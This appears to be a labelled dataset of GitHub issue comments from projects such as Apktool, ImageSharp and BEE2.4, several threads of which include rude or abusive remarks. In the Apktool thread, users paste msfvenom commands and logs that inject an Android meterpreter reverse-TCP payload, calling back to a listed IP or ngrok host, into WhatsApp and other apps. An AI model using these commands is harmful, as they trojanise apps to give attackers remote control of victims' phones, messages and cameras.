openusercss.org/OpenUserCSS/121/400136756,"I agree with you, Maintaining a level of decency and not lowering tone with superior condescending hypocritical behaviour,which has been so adeptly demonstrated that Martii character. Personally I dont have the inclination or time for people which only flexibility in ANY conversation on the web,  is to quote some psycho-babel buzz word of the 80's and derogatory insults. Blocked and there it shall remain. ",,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/400183276,@friend  Clearly the the-j0k3r is not abiding by your advice and being beyond snarky. This will make me not interested in assisting anyone here both personally and professionally. I would recommend you locking topics. I'm considering a ban along with the report for this user. ,,True,False,openusercss.org/OpenUserCSS/121
Apktool/iBotPeaches/1707/356680980,"Unfortunately apktool seems to be packaged into a 3rd party application here using apktool to pack some payload into an application. The reason for the build failure is not including in this stacktrace so nothing I can do here. Thanks for the report, but not enough details here for me to investigate. ",,False,False,1707
Apktool/iBotPeaches/1707/356681366,What details do you need? I will provide because I really need to get this fixed ,,False,False,1707
Apktool/iBotPeaches/1707/287520345,"I am using apktool v 2.3.1. on Kali Linux. I get this error. Yesterday I have tried and it worked, today I get this error with any APK, tried at least 10. "" Using APK template Whatsappo.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.whatsapp.zumvr [] Loading /tmp/d20180110-6408-1ej4cd4/original/smali/com/whatsapp/AppShell.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [*] Rebuilding Whatsappo.apk with meterpreter injection as /tmp/d20180110-6408-1ej4cd4/output.apk Error Unable to rebuild apk with apktool "" ",,False,False,1707
Apktool/iBotPeaches/1707/356682563,"I am really sorry, I'm in a hurry. msfvenom -x Whatsappo.apk -p android/meterpreter/reverse_tcp LHOST=MY IPLPORT=6666 -o W.apk Using APK template Whatsappo.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.whatsapp.megzx [] Loading /tmp/d20180110-6779-18jmnct/original/smali/com/whatsapp/AppShell.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [*] Rebuilding Whatsappo.apk with meterpreter injection as /tmp/d20180110-6779-18jmnct/output.apk Error Unable to rebuild apk with apktool root@friend~/Desktop/MSF/Original APKS# ",,False,False,1707
Apktool/iBotPeaches/1707/356681929,Generally every bit of details that the issue template requests. You removed it and just posted a stacktrace of a 3rd party tool that didn't even expose the stacktrace from Apktool. So generally useless for me. I would report this to whatever tool this is. ,,False,False,1707
Apktool/iBotPeaches/1707/394502877,really . is there no solution ,,False,False,1707
Apktool/iBotPeaches/1707/416230209,Error Unable to rebuild apk with apktool ,,False,False,1707
Apktool/iBotPeaches/1707/422911829,any one have a solution? ,,False,False,1707
Apktool/iBotPeaches/1707/392445449,"how to fix this error msfvenom -x /root/Desktop/Musixmatch.apk -p android/meterpreter/reverse_tcp LHOST=197.231.43.178 LPORT=6060 -o /root/Desktop/Musixmatchreload.apk Using APK template /root/Desktop/Musixmatch.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.musixmatch.android.lyrify.pnriw [] Loading /tmp/d20180528-4429-p0wqf6/original/smali/o/abm.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.ACCESS_FINE_LOCATION""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CHANGE_WIFI_STATE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SEND_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.ACCESS_COARSE_LOCATION""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECEIVE_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CAMERA""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [*] Rebuilding /root/Desktop/Musixmatch.apk with meterpreter injection as /tmp/d20180528-4429-p0wqf6/output.apk Error Unable to rebuild apk with apktool ",,False,False,1707
Apktool/iBotPeaches/1707/425277216,here you can solve the problem as i answered this question on stackoverflow Link To The Answer On Stack Over Flow ,,False,False,1707
Apktool/iBotPeaches/1707/429723785,Error Unable to rebuild apk with apktool my apktool is already updated ,,False,False,1707
Apktool/iBotPeaches/1707/437947892,i have updated the answer on StackOverflow Follow The mentioned link again. ,,False,False,1707
Apktool/iBotPeaches/1707/437934668,"I too have the same error root@friend~/Downloads# msfvenom -x myidea.apk -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=11560 -o /root/Desktop/myideafreerecharge.apk Using APK template myidea.apk [-] No platform was selected, choosing MsfModulePlatformAndroid from the payload [-] No arch selected, selecting arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.ideacellular.myidea.qwpse [] Loading /tmp/d20181112-9095-1hglxlh/original/smali/com/ideacellular/myidea/MyIdeaApplication.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECORD_AUDIO""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CHANGE_WIFI_STATE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECORD_AUDIO""/&gt; [*] Rebuilding myidea.apk with meterpreter injection as /tmp/d20181112-9095-1hglxlh/output.apk Error Unable to rebuild apk with apktool my apktool is updated to latest version 2.3.4 ",,False,False,1707
Apktool/iBotPeaches/1707/437950577,already tried but not working ,,False,False,1707
Apktool/iBotPeaches/1707/437953446,"what didn't work ? did u injected manually and rebuilt your apk using ""android studio"" ? ",,False,False,1707
Apktool/iBotPeaches/1707/437955817,i have updated my apktool by following ur steps  installed zipalign and tried my process as above  still getting the same error ,,False,False,1707
Apktool/iBotPeaches/1707/437957358,"as i said in ""In The End"" Part , if you still having the rebuilding problem , it's because of apktool that cannot rebuild large apk files, use lower size apk file (&lt;5MB) or use another tool for rebuilding your apk file and inject your Codes or files manually also. ",,False,False,1707
Apktool/iBotPeaches/1707/437960657,another tools??? ,,False,False,1707
Apktool/iBotPeaches/1707/437961408,same problem when using 1.3 mb file ,,False,False,1707
Applied-Energistics-2/AppliedEnergistics/3507/325441833,"  Description EnderIO does not replace all Flour-Items from AppliedEnergistics2. The Pulverizer from ThermalExpansion normally produces AppliedEnergistics2 Flour, but in combination with EnderIO it just produces AppliedEnergistics2 Disabled Item. All other grinders (like SAG-Mill, Grindstone, etc.) produce the EnderIO dustWheat. Environment Steps to reproduce  Install AppliedEnergistics2, ThermalExpansion and EnderIO Place a Pulverizer, power it and put Wheat in it. AppliedEnergistics2 Disabled Item is produced  EnderIO 1.12.2-5.0.21  EnderCore 1.12.2-0.5.18 Minecraft 1.12.2 Forge 14.23.3.2655 AppliedenErgistics2 rv5-stable-11 ThermalExpansion 1.12.2-5.4.2.25-universal  ",,False,False,3507
Applied-Energistics-2/AppliedEnergistics/3507/392223425,Oh never mind... Going to replace AE2 with Refined Storage and ask everyone with similar problems to do so as well... They at least respond to issue posts... And they don't have this and similar problems... Bye bye AE2 ,,False,False,3507
Applied-Energistics-2/AppliedEnergistics/3507/392234311,No need to become rude just because you are impatient. The devs are doing it for free and don't owe you shit so you are free to not use ae2 ,,False,False,3507
Applied-Energistics-2/AppliedEnergistics/3800/372806747,"Whenever i load my world my fps stutters heavily and eventually the game freezes  When the game locks it never starts back up again, Using custom modpack i made in twitch client, in Singleplayer log  Version 1.12.2 AE2 Version rv6-stable-3 Forge Version 14.23.5.2770  ",,False,False,3800
Applied-Energistics-2/AppliedEnergistics/3800/432731961,"Does this happen always? If so can you try and reduce the amount of mods to a mininum amount possible, or alternative remove just one or 2 until it no longer appears? On the first glance it looks like something tries to use multithreaded worldloading, which is just wrong and we are just the first mod affected by it and crash therefore. ",,False,False,3800
Applied-Energistics-2/AppliedEnergistics/3800/432777456,Will do this evening ,,False,False,3800
Applied-Energistics-2/AppliedEnergistics/3800/433599536,"@friend what was your findings, having same problem in my quite random private SP pack ",,False,False,3800
Applied-Energistics-2/AppliedEnergistics/3800/433609434,i couldnt find the mod causing it. No matter the combonation it seemed to happen at random and only in that world ,,False,False,3800
Applied-Energistics-2/AppliedEnergistics/3800/451806556,"Encountering this too. I have been trying for some days now on a reproduction method but cannot find the cause as of yet. ♠Time 1/7/19 323 AM Description Exception in server tick loop java.util.ConcurrentModificationException     at java.util.LinkedHashMap$LinkedHashIterator.remove(Unknown Source)     at appeng.me.cache.EnergyGridCache.extractProviderPower(EnergyGridCache.java316)     at appeng.me.cache.EnergyGridCache.extractAEPower(EnergyGridCache.java248)     at appeng.me.cache.EnergyGridCache.onUpdateTick(EnergyGridCache.java199)     at appeng.me.GridCacheWrapper.onUpdateTick(GridCacheWrapper.java43)     at appeng.me.Grid.update(Grid.java280)     at appeng.hooks.TickHandler.onTick(TickHandler.java228)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler_1573_TickHandler_onTick_TickEvent.invoke(.dynamic)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.java90)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java677)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java634)     at net.minecraftforge.fml.common.FMLCommonHandler.onPostServerTick(FMLCommonHandler.java266)     at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java712)     at net.minecraft.server.MinecraftServer.run(MinecraftServer.java526)     at java.lang.Thread.run(Unknown Source) A detailed walkthrough of the error, its code path and all known details is as follows -- Head -- Thread Server thread Stacktrace     at java.util.LinkedHashMap$LinkedHashIterator.remove(Unknown Source)     at appeng.me.cache.EnergyGridCache.extractProviderPower(EnergyGridCache.java316)     at appeng.me.cache.EnergyGridCache.extractAEPower(EnergyGridCache.java248)     at appeng.me.cache.EnergyGridCache.onUpdateTick(EnergyGridCache.java199)     at appeng.me.GridCacheWrapper.onUpdateTick(GridCacheWrapper.java43)     at appeng.me.Grid.update(Grid.java280)     at appeng.hooks.TickHandler.onTick(TickHandler.java228)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler_1573_TickHandler_onTick_TickEvent.invoke(.dynamic)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.java90)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java677) -- Sponge PhaseTracker -- Details     Phase Stack [Empty stack] Stacktrace     at net.minecraft.server.MinecraftServer.handler$onCrashReport$zjk000(MinecraftServer.java3980)     at net.minecraft.server.MinecraftServer.func_71230_b(MinecraftServer.java889)     at net.minecraft.server.dedicated.DedicatedServer.func_71230_b(DedicatedServer.java371)     at net.minecraft.server.MinecraftServer.run(MinecraftServer.java558)     at java.lang.Thread.run(Unknown Source) ",,False,False,3800
Applied-Energistics-2/AppliedEnergistics/3800/451859209,"can you possibly test without sponge? other than that, this MAY be an power issue, try to add some dense enrgy cells to your network, it is possible that your system has too low capacity and stall during startup in an infinite loop ... and maybe sponge with some tick shenanigangs grinds it to a halt ",,False,False,3800
Applied-Energistics-2/AppliedEnergistics/3800/451964967,OP wasn't using Sponge. Sponge has nothing to do with this error. ,,False,False,3800
Applied-Energistics-2/AppliedEnergistics/3800/451980062,"Was i referring to op?  I quoted your log and the advice was meant in general, how about being constructive and check for what i wrote? ",,False,False,3800
Applied-Energistics-2/AppliedEnergistics/3800/451983655,"Original poster. If you check his crash report, he's not using Sponge. It's just a bias towards Sponge and if someone is gonna to push bias in-front of me I'm going to slap you down. Stop it. ",,False,False,3800
Applied-Energistics-2/AppliedEnergistics/3800/452023398,So in that case perhaps help us out a little. You did not post your whole log so we can not see what mods you have so we cannot look for mods you may have in common with the OP. ,,False,False,3800
Applied-Energistics-2/AppliedEnergistics/3800/452027664,"3812, #3831 Plenty of crash reports to build enough correlation. I don't understand the Sponge hate and it's completely unnecessary and off-topic. Suddenly people care about this because ""Sponge"". Really interesting. ",,False,False,3800
Applied-Energistics-2/AppliedEnergistics/3800/452031156,"Asking to try it without sponge is perfectly fine. It could easily be caused by some changes to chunkloading or similar system, which sponge likes to do and some other mod might simply include similar changes because they claimed it should be 5% faster but crashes in return. It would simply remove some variables and could make it easier. Or at least rule it out as possible cause. But it appears you are not actually interested in identifying a potential cause as well as reject a simple and quick request. So I do not see any chance to get something useful out of it from discussing it any further. ",,False,False,3800
BEE2.4/BEEmod/937/333006808,"This is a problem that many people have. It's a puzzle not building with prerelease 28 or 29. I never copied the output, but let's just say that it could even be blank and it will still fail. I'm trying right now to make a map that involves wall climbing. If you don't know what wall climbing is, you put a cube down to the corner of 2 walls, and put something ontop of it that's small, like a camera. I will try pre release 27 for this, and if it does have this issue, this needs to be fixed in prerelease 30 unless you can give me a fix. ",,False,False,937
BEE2.4/BEEmod/937/398653725,"When using BEE2.4 after installing a new version, old resources from past releases will not be overwritten, resulting in bugs that were fixed still being present and some things not working correctly. Your issue clearly seems te be related to this, so in order to solving this annoyance, you will have to do the following 1 - Open Beemod and click on . 2 - Wait 1 minute while Beemod removes their resources from Portal 2. 3 - Verify the Game Cache Files. 4 - Make sure to have downloaded and unzipped the latest Item's Packages and Application version of BEE2.4, and both must be from the same Pre-Release Version, otherwise bugs may occur. Links  (Application)   (Item's Packages) Note that if you are running Beemod on Linux or Mac Os X, or even on 32 Bit versions of Windows, issues can occur. Beemod currently works well only on 64 Bit versions of Windows 7, 8 and 10. 5 - Click on , then uncheck the option . 6 - Now choose your favorite Items &amp; Style and export your palette to the game. 7 - Make sure to save these steps in a text file in case you get similar issues in the future. 8 - Happy mapmaking! ",,False,False,937
BEE2.4/BEEmod/937/398717271,Why close it? It’s possible that it won’t work. ,,False,False,937
BEE2.4/BEEmod/937/399207879,"This still didn't fix it, so who's the noob now? Give me the actual fix, you bitch. ",,False,False,937
BEE2.4/BEEmod/937/399208861,Woah that came out of nowhere Icy. Calm yourself Lautaro's ways has worked for me and if its not working for you. You probably did something wrong. Or your items are placed in ways that break the map. Check the placement of items and their orientations. Make sure no items are behind/below partial blocks. etc. ,,False,False,937
BEE2.4/BEEmod/937/399210524,"it all checks out, I did all of the stuff he said, nothing works... But this error message came through. Get your ass ready though, it's quite long. compile errors.txt ",,False,False,937
BEE2.4/BEEmod/937/399212366,That seems to be your issue but I dont know how to fix that. Ask Lautaro or someone ,,False,False,937
BEE2.4/BEEmod/937/399270503,@friend Please no swearing there is no need for it. ,,False,False,937
BEE2.4/BEEmod/937/399380043,Lol it is pretty fun for me to see when noobs gets mad so easily. ,,False,False,937
BEE2.4/BEEmod/937/399473737,"Uhmm... How about no? I am not the author of Beemod, the author is @friend, which is the one who works on the compiler thing. I am just a collaborator. PrayForNoobs ",,False,False,937
BEE2.4/BEEmod/937/399548155,"well I need a fix, I even had to have my friend fucking publish one of my levels for me, I don't want everything I make to be my friend's shit anymore. ",,False,False,937
BEE2.4/BEEmod/937/399608627,@friend Please stop with the swearing there is no need for it. ,,False,False,937
BEE2.4/BEEmod/937/399609102,"In light of the Bee2 Contributing Guidelines, this issue is getting locked due to excessive fowl language and toxicity. Please do not repeat this behavior in future issues. ",,False,False,937
BEE2.4/BEEmod/937/399609203,@friend Good thinking. ,,False,False,937
Croppie/Foliotek/587/380720280,"I've spent 3 DAYS configuring this plugin to work nicely in a Bootstrap modal and the final result looks UGLY. It turned out that the plugin has numerous issues. In other cases, I'd fill detailed bug reports, but now I feel so desperate... I don't see any sense in posting issues that will duplicate existing ones. If you're reading this while choosing a JS plugin for image cropping, DO NOT USE CROPPIE!!! Go look for any better alternatives. The most important issues that I encountered  when input image is of type JPG and I try to get result (of type PNG by default), it produces a blank image. when  and  and image is zoomed in, it's possible to drag viewport bounds outside of the container bounds. it results in hidden viewport bounds and an overzoomed image; it's impossible for user to fix this, user is forced to refresh the whole page. when  it's impossible to make aspect ratio fixed.  Expected Behavior it works. Actual Behavior it doesn't.  Browser Chrome 71 Plugin version 2.6.2  ",,False,False,587
Croppie/Foliotek/587/438710257,"Sorry you experienced issues with croppie.  I'll be the first to admit that I don't have as much time as I'd like to support this anymore. That being said, plenty of people use croppie with the bootstrap modals  you don't want to use Croppie, that's fine.  I honestly don't care.  But to post an insulting issue in an open source project that I (and several other people) have spent a lot of time building, and have been gracious enough to share with the community  .... is rude. Next time try just asking for help before you lose your temper. ",,False,False,587
ImageSharp/SixLabors/485/303910639,"Prerequisites  [ ] I have written a descriptive issue title [ ] I have verified that I am running the latest version of ImageSharp [ ] I have verified if the problem exist in both  and  mode [ ] I have searched open and closed issues to ensure it has not already been reported  Description   Steps to Reproduce   System Configuration    ImageSharp version Other ImageSharp packages and versions Environment (Operating system, version and so on) .NET Framework version Additional information  ",,False,False,485
ImageSharp/SixLabors/485/371893483,please direct questions to our gitter channel as it says in our readme ,,False,False,485
ImageSharp/SixLabors/485/371902764,"Thank you,  Scott, for the answer so quick.  I am very new to using this channel. Please accept my excuse.) So the question for me was .. when I save the image, the size of a saved image is not the correct size. I think this problem probably comes from my OS(Windows 10).  I wanted to know if is there another way to save the image in your library. Thank you very much. ",,False,False,485
ImageSharp/SixLabors/485/371909184,"This problem I have faced before. When I tried to save image as an object directly, no matter bitmap or image object in windows forms by c#, I had the problem.  The size of the saved image was always wrong. I do not remember but I think I have solved by using file stream class.. It may give a clue. I will try to find a way base on this experience.  Not sure If I can. ",,False,False,485
ImageSharp/SixLabors/485/371916534,"@friend can you be more specific? We hardly understand your issue.  When getting incorrect results Are you trying to resize + save your image with ? Or are you trying ImageSharp? (We do not depend on OS services at all btw.) If you are looking for basic ImageSharp resize examples, just go through our main README. ",,False,False,485
ImageSharp/SixLabors/485/371918622,"If your issue is ImageSharp specific, and you are getting results different from what you expect Can you please share a basic sample code snippet/console application reproducing your issue with your sample image attached? ",,False,False,485
ImageSharp/SixLabors/485/371927184,"The image uploaded is 4.30 MB .the Image saved by the code below is always as less than 1 MB.                 using (var memoryStream = new MemoryStream())                 {                     fl.CopyTo(memoryStream);                     using (Image&lt;Rgba32&gt; image = Image.Load&lt;Rgba32&gt;(memoryStream.ToArray()))                     {                          //with encoder it changes but still wrong                         //without encoder it allways wrong size for saved image                         IImageEncoder imageEncoder = new JpegEncoder()                         {                             Quality = 90,                             Subsample = JpegSubsample.Ratio444                         };                           image.Mutate(x =&gt;                         {                             x.AutoOrient();                             //x.Resize(image.Width / 2, image.Height / 2);                             image.Save&lt;Rgba32&gt;(fileSaveUrl, imageEncoder);                             x.Grayscale();                             image.Save(fileSaveGrayUrl, imageEncoder);                             x.BlackWhite();                             image.Save&lt;Rgba32&gt;(fileSaveBWUrl, imageEncoder);                             x.Lomograph(new SixLabors.Primitives.Rectangle(5, 5, 300, 400));                             image.Save&lt;Rgba32&gt;(fileSaveLMUrl, imageEncoder);                         });                       }                 }  ",,False,False,485
ImageSharp/SixLabors/485/371933035,"So you mean file size. It wasn't clear from your original post, ""image size"" usually means image dimensions. By applying filters like blackwite or grayscale, you are loosing information, and jpeg is a compressed format, so it works as expected. Do you also get a 4x smaller file size after applying AutoOrient (without doing a resize)? Can you share a sample image reproducing the issue? Can you also explain why is this an issue in your application? Is the image quality insufficient? ",,False,False,485
ImageSharp/SixLabors/485/371933945,"on min, please I am installing visual studio preview.  Later on, I will send you both the source image and the output image. ",,False,False,485
ImageSharp/SixLabors/485/371935503,"You seem to keep describing what your seeing not what the problem is.. basically we need to know why a 1mb file is wrong. As far as I can see you are taking an image, resizing it so that it 4 times less the number of pixels and are confused about the fact you are getting an image out that's 4 times smaller, personally that's an outcome I would be hoping for. ",,False,False,485
ImageSharp/SixLabors/485/371937732,"I guess you need to deal with it. As I have mentioned before. When somehow an image is resized by c# in windows machine I mean visual studio and when we did a save this resized Image directly, Like img.Save(....) , this problems comes out. So it was a long time ago, as I remember, my solution was, to read and write with byte arrays using filestream objects. So my opinion, the problem is not coming from your code but you need to handle this problem. I will share with you the details. ",,False,False,485
ImageSharp/SixLabors/485/371939039,We need to deal with nothing. Our operations work well. You STILL haven't described why 1mb is wrong. ,,False,False,485
ImageSharp/SixLabors/485/371939450,"Because I did not resize . ıt should be the same size  //x.Resize(image.Width / 2, image.Height / 2);  it is only comment ",,False,False,485
ImageSharp/SixLabors/485/371939806,4.30 MB the source the destination is less than 1mb without resizing ,,False,False,485
ImageSharp/SixLabors/485/371940227,All that means is you have likely used a better/higher compression ratio than the original source image. Unless the output actually looks wrong to a human eye then it's doing exactly the right thing. ,,False,False,485
ImageSharp/SixLabors/485/371941320,the output looks exactly like the source. Only the source is 4.30 MB output is something like 800kb The properties of output are similar to the source but the size is different. In 10 min I can share proper code and related images . Give me time please I will be more clear. ,,False,False,485
ImageSharp/SixLabors/485/371941648,"Then well done you have successfully used imagesharp, and we have saved you alot of space. Your welcome. That's exactly the output imagesharp is trying to accomplish. ",,False,False,485
ImageSharp/SixLabors/485/371944685,"    public IActionResult OnPost()     {         if (MyFiles.Count &gt; 0)         {             foreach (IFormFile fl in MyFiles)             {                 FileInfo flInfo = new FileInfo(fl.FileName);                 string getExt = flInfo.Extension.ToLower();                 string newFileName = RandomString(5) + getExt;                 string fileSaveUrl = Path.Combine(TempUploadFolderPath, newFileName);                  using (var memoryStream = new MemoryStream())                 {                     fl.CopyTo(memoryStream);                     using (Image&lt;Rgba32&gt; image = Image.Load&lt;Rgba32&gt;(memoryStream.ToArray()))                     {                         image.Mutate(x =&gt;                         {                             image.Save&lt;Rgba32&gt;(fileSaveUrl);                         });                     }                 }              }              return null;         }         else         {             Message = ""File not selected"";         }         return null;     }  ",,False,False,485
ImageSharp/SixLabors/485/371944927,source image is 2.24 MB otput image is  474KB ,,False,False,485
ImageSharp/SixLabors/485/371945930,"If I use  IImageEncoder like                         IImageEncoder imageEncoder = new JpegEncoder()                         {                             Quality = 90,                             Subsample = JpegSubsample.Ratio444                         };                          image.Mutate(x =&gt;                         {                             image.Save&lt;Rgba32&gt;(fileSaveUrl, imageEncoder);                         });  ",,False,False,485
ImageSharp/SixLabors/485/371946582, Images please. Explain please why is this behavior wrong for you? It's a good thing to have smaller files.  ,,False,False,485
ImageSharp/SixLabors/485/371947096,"source still the same 2.24MB the output image is 1.06MB     better but not similar. I can understand because it passes through jpeg compression but still the difference is big. Still, I think this is the windows issue.  Would be nice to handle. Thank you very much for your patience. I continue to follow you. Have fun ",,False,False,485
ImageSharp/SixLabors/485/371948950,Consider I bought 1 kg apple in the market at home it becomes 300 gr .) or reverse it at home you produce 1Kg apple when you arrived at the market you have 250 gr to sell... It is ok not much important.  Only sounds a bit not natural. ) ,,False,False,485
ImageSharp/SixLabors/485/372017993,"I did s simply a joke base on  your answer(--Explain please why is this behavior wrong for you? It's a good thing to have smaller files.)  But still the question is there (--Your input images are probably saved at 100 quality, you're saving at 75 and then 90. This changes the way the quantizer ....) In the code, I have an example which saves the image without defining the quality and in another example with defining the quality. The output is not similar but in both, the output is not the correct size. My purpose is trying to understand your library and use it. Because I have found it brilliant. Also, I have shared the issue  I have faced.  For the purpose to help for improving.  Sorry for the joke. The issue is still there... ",,False,False,485
ImageSharp/SixLabors/485/371974103,"The difference is staring you in the face. You've clearly demonstrated what affects the output size. Your input images are probably saved at 100 quality, you're saving at 75 and then 90. This changes the way the quantizer within jpeg uses colors and sampling and can cause a massive drop in image size with very little difference in quality. Something you could have easily researched. It's all on Wikipedia for example. Now.... I need you to stop posting here. This is an issue tracker, for real issues not a forum for you to discuss your fantastical ideas. We have clear guidelines which you obviously ignored. If you continue to waste our time you will be blocked. Do you understand? ",,False,False,485
ImageSharp/SixLabors/485/372018240,"@friend what we are trying to tell you is there is no issue... the library is working as designed you feed it an image (that may or may not have been previously saved in a optimised fashion) you then save it and we do all the optermisation on the image we can to reduce file size (thus we actually reduce the size significantly), unless there is actual issue with the visual output of the image then we have done our jobs very well and there is no issue/bug. As ee are getting no where repeating the fact that saving a file and reducing the size with out effecting the visual quality is a good thing i'm locking this thread. ",,False,False,485
ImageSharp/SixLabors/513/310899308,"Description When compiling against net451 I get multiple errors that are no present when compiling against netstandard2.0. Steps to Reproduce The following line will error when compiling against net451. System Configuration  ImageSharp version 1.0.0-beta0003 Other ImageSharp packages and versions n/a Environment (Operating system, version and so on) Windows 10 .NET Framework version All Additional information n/a  ",,False,False,513
ImageSharp/SixLabors/513/378331965,The .NETStandard 1.1 target utilized for NET451 is missing some file APIs that you are trying to use. Are you able to target .NET461? ,,False,False,513
ImageSharp/SixLabors/513/378364568,"Yeah, that’s not a bug. We also even show in the example code in the readme that the File API overload requires netstandard 1.3+ ",,False,False,513
ImageSharp/SixLabors/513/378375121,Can you explain why you can't target net451? Usually any code that compiles for netstandard2.0 will also compile against net451! ,,False,False,513
ImageSharp/SixLabors/513/378377532,.NET 4.5.1 was released in 2013 and is no longer supported by Microsoft.  Is there a reason you are unable to target a higher framework version? ,,False,False,513
ImageSharp/SixLabors/513/378427903,"@friend just take a stream using  and pass it to . @friend on one hand, I really really want to get rid of NET Standard 1.1, but on the other hand there are so many large enterprises having stupid IT limitations keeping them in the stone age. I really wish we knew how many users do we have amongst such companies. @friend is this your case? 😄 ",,False,False,513
ImageSharp/SixLabors/513/378512698,"@friend - The reason a lot of projects target net451 as well as netstandard2.0 is that although you need net461 for netstandard2.0 the API surface for net451 is almost identical to netstandard2.0 and in most cases you will be able to target net451 without any code changes. @friend - For me the two required targets would be net451 and netstandard2.0. The net451 target would allow us to keep supporting customers on Windows Server 2008 with extended maintenance. The netstandard2.0 target would be for for new development. @friend - My personal opinion is that .NET Standard versions earlier than 2.0 are at best confusing. Based on the above grid, my suggestion would be to target netstandard2.0, netstandard1.2 and net451. This would not only give multiple targets but the available methods would be based on capability and not the arbitrary .NET Standard versions. ",,False,False,513
ImageSharp/SixLabors/513/378514956,@friend You do understand with an explicit  target you're asking us to target a brand new library against an obsolete framework with no security updates available? ,,False,False,513
ImageSharp/SixLabors/513/378541829,"@friend - Targeting net451 will allow better support for .NET 4.5.1, .NET 4.6, Mono 4.6 to 5.2. If you can target net451 I don't see the problem in doing so as the framework choice is down to the package consumers who might have a valid reason for requiring net451 (e.g. Windows Server 2008). ",,False,False,513
ImageSharp/SixLabors/513/378553868,@friend All of those frameworks are supported by Net Standard 1.1 I think you are failing to understand exactly what a standard is. I suggest you look again at the picture I posted above. You might not see a problem but I most definitely do. Targeting .NET 4.5.1  Adds complexity to the build Can severely limit future development Means that I am now referencing unsupported binaries that may well contain security issues.  And for what? So you can avoid using a FileStream in your consuming code and support an operating system that has another 1 1/2 years of support? There's a sense of entitlement here I am detecting that I find deeply unpleasant. You are asking me to do what a soon to be trillion dollar company will not and cannot do. I'm going to lock this issue now and I suggest you have a good think about your attitude towards open source. ,,False,False,513
JustEnoughItems/mezz/1153/299938680,"Not 100% sure but, after looking for 6 minuets in keybinds and options in jei I can't find a hide jei all option only the left panel. The point of this would be your tired of it for a bit and want to remove it or you don't want others to think your cheating in survival. Default keybind""o"" Also keep the boolean public so modders can decide where and when to hide it ",,False,False,1153
JustEnoughItems/mezz/1153/368265363,JEI doesn't have a left panel. The item list can be hidden with CTRL + O ,,False,False,1153
JustEnoughItems/mezz/1153/368265558,Ever heard of encapsulation)? ,,False,False,1153
JustEnoughItems/mezz/1153/368301848,um key bind to hid the right panel control + o hides the left panel when addons are in ,,False,False,1153
JustEnoughItems/mezz/1153/368337276,Then you should request those addons add their own keybind. They have absolutely nothing to do with JEI. ,,False,False,1153
JustEnoughItems/mezz/1153/368384129,No because the other addons can't hide jei jei needs to get hidden with a keybind or under specified conditions via boolean visible not the addon pannel ,,False,False,1153
JustEnoughItems/mezz/1153/368384494,"JEI does not draw on the left side of the screen. JEI's keybind for hiding itself (the right side ingredient list) is Control+O by default, and configurable in the controls menu. If it is not working, or the behavior is changed, it's because some other mod is messing it up. Please find out which and report to them. ",,False,False,1153
JustEnoughItems/mezz/1153/368384533,Did You read I said right side ,,False,False,1153
